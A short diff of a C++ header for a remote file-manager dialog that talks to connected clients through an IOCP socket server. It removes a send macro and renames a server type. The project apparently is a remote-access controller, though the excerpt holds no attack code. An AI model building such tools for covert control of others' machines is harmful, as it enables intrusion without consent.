@@ -26,8 +26,6 @@ typedef struct
 
 #define m_Socket sClientSocket
 
-#define Send OnClientPreSending
-
 #define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))
 
 #define	MAX_WRITE_RETRY			15 // 重试写入文件次数
@@ -105,7 +103,7 @@ public:
 	void FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen);
 
 	CStatusBar m_wndStatusBar;
-	CFileManagerDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
+	CFileManagerDlg(CWnd* pParent = NULL, Server* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
 
 	~CFileManagerDlg()
 	{
